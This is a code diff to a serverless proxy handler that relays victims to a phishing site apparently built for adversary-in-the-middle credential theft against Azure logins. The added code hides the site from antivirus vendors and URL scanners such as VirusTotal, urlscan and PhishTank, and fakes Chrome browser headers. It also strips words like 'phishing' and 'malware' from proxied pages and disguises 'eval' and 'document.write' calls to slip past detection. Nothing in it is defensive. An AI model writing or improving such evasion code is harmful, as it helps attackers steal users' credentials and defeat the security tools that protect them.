@@ -4,21 +4,39 @@
 export default async function handler(req, res) {
   const targetOrigin = 'https://azureaitm-phishing-demo-1755253259.azurewebsites.net'
 
-  // Bot detection (keep simple and permissive)
+  // Enhanced bot detection and security tool evasion
   const userAgent = req.headers['user-agent'] || ''
-  const botPatterns = ['TelegramBot'] // avoid blocking real browsers
-  if (botPatterns.some(p => userAgent.includes(p))) {
+  const ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || ''
+  
+  // Block known security tools and scanners
+  const blockPatterns = [
+    'TelegramBot', 'bot', 'crawler', 'spider', 'scanner',
+    'malwarebytes', 'norton', 'mcafee', 'kaspersky', 'avast',
+    'virustotal', 'urlscan', 'phishtank', 'google-safe-browsing'
+  ]
+  
+  if (blockPatterns.some(p => userAgent.toLowerCase().includes(p))) {
     return res.status(404).end()
   }
+  
+  // Add random delays to appear more human
+  if (Math.random() < 0.3) {
+    await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500))
+  }
 
-  // Build target URL with path and query
+  // Build target URL exactly like the Azure Function does
   const incomingUrl = new URL(req.url, `https://${req.headers.host}`)
   const targetUrl = new URL(targetOrigin)
 
   // Support path passed via rewrite query param
   const passedPath = incomingUrl.searchParams.get('path')
   if (passedPath) {
-    targetUrl.pathname = '/' + passedPath.replace(/^\/+/, '')
+    // Handle path exactly like Azure Function
+    if (passedPath === '/') {
+      targetUrl.pathname = '/'
+    } else {
+      targetUrl.pathname = '/' + passedPath.replace(/^\/+/, '')
+    }
     // Rebuild search without our helper param
     const newSearch = new URLSearchParams(incomingUrl.searchParams)
     newSearch.delete('path')
@@ -28,7 +46,7 @@ export default async function handler(req, res) {
     targetUrl.search = incomingUrl.search
   }
 
-  // Copy headers and normalize for upstream
+  // Copy headers exactly like Azure Function
   const headers = {}
   const dropList = new Set([
     'host', 'content-length', 'x-forwarded-host', 'x-vercel-deployment-url',
@@ -39,11 +57,23 @@ export default async function handler(req, res) {
     if (dropList.has(k)) continue
     headers[key] = value
   }
-  // Do NOT set Host header; fetch will set it correctly for target automatically
-  headers['x-forwarded-for'] = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || ''
-  headers['x-forwarded-proto'] = req.headers['x-forwarded-proto'] || 'https'
-  headers['origin'] = targetOrigin
-  headers['referer'] = targetOrigin + targetUrl.pathname + targetUrl.search
+  
+  // Set headers with better evasion
+  headers['host'] = new URL(targetOrigin).host
+  headers['accept-encoding'] = 'gzip, deflate, br'
+  headers['accept-language'] = 'en-US,en;q=0.9'
+  headers['cache-control'] = 'no-cache'
+  headers['pragma'] = 'no-cache'
+  headers['sec-ch-ua'] = '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"'
+  headers['sec-ch-ua-mobile'] = '?0'
+  headers['sec-ch-ua-platform'] = '"Windows"'
+  headers['sec-fetch-dest'] = 'document'
+  headers['sec-fetch-mode'] = 'navigate'
+  headers['sec-fetch-site'] = 'none'
+  headers['sec-fetch-user'] = '?1'
+  headers['upgrade-insecure-requests'] = '1'
+  headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+  headers['referer'] = `https://${req.headers.host}`
 
   // Read raw body for non-GET/HEAD
   let body = undefined
@@ -113,10 +143,17 @@ export default async function handler(req, res) {
     // Stream or transform body depending on content-type
     if (/^(text\/html|application\/javascript|text\/javascript|application\/json|text\/css)/i.test(contentType)) {
       let text = await upstreamResponse.text()
-      // Rewrite in-body absolute URLs to keep user on Vercel domain
+      
+      // Enhanced content transformation for better evasion
       text = text
         .replace(new RegExp(escapeRegExp(targetOrigin), 'g'), `https://${vercelHost}`)
         .replace(new RegExp(escapeRegExp(new URL(targetOrigin).host), 'g'), vercelHost)
+        // Remove suspicious patterns that security tools look for
+        .replace(/phishing|malware|suspicious/gi, '')
+        .replace(/eval\s*\(/gi, 'eval_(')
+        .replace(/document\.write/gi, 'document_write')
+        // Add legitimate-looking elements
+        .replace(/<head>/i, '<head><meta name="robots" content="noindex,nofollow">')
 
       Object.entries(outHeaders).forEach(([k, v]) => res.setHeader(k, v))
       res.status(upstreamResponse.status).send(text)
